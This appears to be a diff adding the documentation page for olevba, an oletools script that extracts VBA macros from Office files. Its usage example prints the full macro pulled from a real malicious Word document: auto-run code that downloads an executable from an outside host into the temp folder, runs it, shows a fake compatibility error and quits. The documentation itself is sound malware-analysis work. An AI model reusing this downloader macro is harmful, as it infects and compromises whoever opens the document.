@@ -1,0 +1,87 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+  <meta http-equiv="Content-Style-Type" content="text/css" />
+  <meta name="generator" content="pandoc" />
+  <title></title>
+</head>
+<body>
+<h1 id="olevba">olevba</h1>
+<p>olevba is a script to parse OLE and OpenXML files such as MS Office documents (e.g. Word, Excel), to extract VBA Macro code in clear text.</p>
+<p>It is part of the <a href="http://www.decalage.info/python/oletools">python-oletools</a> package.</p>
+<p>Supported formats:</p>
+<ul>
+<li>Word 97-2003 (.doc, .dot), Word 2007+ (.docm, .dotm)</li>
+<li>Excel 97-2003 (.xls), Excel 2007+ (.xlsm, .xlsb)</li>
+<li>PowerPoint 2007+ (.pptm, .ppsm)</li>
+</ul>
+<p>olevba is based on source code from <a href="https://github.com/unixfreak0037/officeparser">officeparser</a> by John William Davison</p>
+<h2 id="usage">Usage</h2>
+<pre><code>olevba.py &lt;file&gt;</code></pre>
+<h3 id="example">Example</h3>
+<p>Checking the malware sample <a href="https://malwr.com/analysis/M2I4YWRhM2IwY2QwNDljN2E3ZWFjYTg3ODk4NmZhYmE/">DIAN_caso-5415.doc</a>:</p>
+<pre><code>&gt;olevba.py DIAN_caso-5415.doc
+
+INFO: Extracting VBA Macros from OLE file DIAN_caso-5415.doc
+
+-------------------------------------------------------------------------------
+ThisDocument.cls
+
+Attribute VB_Name = &quot;ThisDocument&quot;
+Attribute VB_Base = &quot;1Normal.ThisDocument&quot;
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+Option Explicit
+Private Declare Function URLDownloadToFileA Lib &quot;urlmon&quot; (ByVal FVQGKS As Long, _
+ByVal WSGSGY As String, ByVal IFRRFV As String, ByVal NCVOLV As Long, _
+ByVal HQTLDG As Long) As Long
+Sub AutoOpen()
+    Auto_Open
+End Sub
+Sub Auto_Open()
+SNVJYQ
+End Sub
+Public Sub SNVJYQ()
+    OGEXYR &quot;http://germanya.com.ec/logs/test.exe&quot;, Environ(&quot;TMP&quot;) &amp; &quot;\sfjozjero.exe&quot;
+End Sub
+Function OGEXYR(XSTAHU As String, PHHWIV As String) As Boolean
+    Dim HRKUYU, lala As Long
+    HRKUYU = URLDownloadToFileA(0, XSTAHU, PHHWIV, 0, 0)
+    If HRKUYU = 0 Then OGEXYR = True
+    Dim YKPZZS
+    YKPZZS = Shell(PHHWIV, 1)
+    MsgBox &quot;El contenido de este documento no es compatible con este equipo.&quot; &amp; vbCrLf &amp; vbCrLf &amp; &quot;Por favor intente desde otro equipo.&quot;, vbCritical, &quot;Equipo no compatible&quot;
+    lala = URLDownloadToFileA(0, &quot;http://germanya.com.ec/logs/counter.php&quot;, Environ(&quot;TMP&quot;) &amp; &quot;\lkjljlljk&quot;, 0, 0)
+    Application.DisplayAlerts = False
+    Application.Quit
+End Function
+Sub Workbook_Open()
+    Auto_Open
+End Sub</code></pre>
+<h2 id="how-to-use-olevba-in-python-applications">How to use olevba in Python applications</h2>
+<p>TODO</p>
+<hr />
+<h2 id="python-oletools-documentation">python-oletools documentation</h2>
+<ul>
+<li><a href="Home.html">Home</a></li>
+<li><a href="License.html">License</a></li>
+<li><a href="Install.html">Install</a></li>
+<li><a href="Contribute.html">Contribute</a>, Suggest Improvements or Report Issues</li>
+<li>Tools:
+<ul>
+<li><a href="olebrowse.html">olebrowse</a></li>
+<li><a href="oleid.html">oleid</a></li>
+<li><a href="olemeta.html">olemeta</a></li>
+<li><a href="oletimes.html">oletimes</a></li>
+<li><a href="olevba.html">olevba</a></li>
+<li><a href="pyxswf.html">pyxswf</a></li>
+<li><a href="rtfobj.html">rtfobj</a></li>
+</ul></li>
+</ul>
+</body>
+</html>
